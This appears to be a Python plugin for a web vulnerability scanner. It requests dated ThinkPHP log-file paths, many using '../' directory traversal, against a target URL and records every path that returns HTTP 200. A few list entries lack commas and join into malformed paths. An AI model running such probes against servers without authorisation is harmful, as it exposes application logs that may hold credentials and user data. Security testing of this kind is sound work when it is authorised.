import os
import time
import requests
from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept-Language': '*',
    'Accept-Encoding': '*',
    'Keep-Alive': '300',
    'Connection': 'Keep-Alive',
    'Cache-Control': 'max-age=0'
    }

def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkphp_log_find', 
        "Type": None, 
        "Request": None
    }

    # payload 
    filename = time.strftime("%Y%m/%d", time.localtime())
    filename2 = time.strftime("%Y_%m_%d", time.localtime())[2:]
    payloads = [
            f"../../runtime/log/{filename}.log",
            f"../../Home/Temp/log/{filename}.log",
            f"../../runtime/index/log/{filename}.log",
            f"../../runtime/admin/log/{filename}.log",
            f"../runtime/log/{filename}.log",
            f"../Home/Temp/log/{filename}.log",
            f"../runtime/index/log/{filename}.log",
            f"../runtime/admin/log/{filename}.log",
            f"runtime/log/{filename}.log",
            f"Home/Temp/log/{filename}.log",
            f"runtime/index/log/{filename}.log",
            f"runtime/admin/log/{filename}.log",
            f"../../Temp/Logs/{filename2}.log",
            f"../../Runtime/Logs/Home/{filename2}.log",
            f"../../Runtime/Logs/{filename2}.log",
            f"../../Runtime/Logs/Common/{filename2}.log",
            f"../../Application/Runtime/Logs/Common/{filename2}.log",
            f"../../Application/Runtime/Logs/Home/{filename2}.log",
            f"../../Application/Runtime/Logs/Admin/{filename2}.log",
            f"../../App/Runtime/Logs/Home/{filename2}.log"
            f"../Temp/Logs/{filename2}.log",
            f"../Runtime/Logs/Home/{filename2}.log",
            f"../Runtime/Logs/{filename2}.log",
            f"../Runtime/Logs/Common/{filename2}.log",
            f"../Application/Runtime/Logs/Common/{filename2}.log",
            f"../Application/Runtime/Logs/Home/{filename2}.log",
            f"../Application/Runtime/Logs/Admin/{filename2}.log",
            f"../App/Runtime/Logs/Home/{filename2}.log"
            f"Temp/Logs/{filename2}.log",
            f"Runtime/Logs/Home/{filename2}.log",
            f"Runtime/Logs/{filename2}.log",
            f"Runtime/Logs/Common/{filename2}.log",
            f"Application/Runtime/Logs/Common/{filename2}.log",
            f"Application/Runtime/Logs/Home/{filename2}.log",
            f"Application/Runtime/Logs/Admin/{filename2}.log",
            f"App/Runtime/Logs/Home/{filename2}.log"
        ]

    try:
        s = requests.session()
        s.keep_alive = False
        for payload in payloads:
            # print(url + ' ' + payload)
            r = s.get(url + payload, headers=headers)
            if r.status_code == 200:
                items['Type'] = 'GET'
                items['Request'] = make_request_package(r.request)
                results.append(items.copy())

        if len(results) == 0:
            return False
        return results
    except Exception as e:
        print(e)
        return False
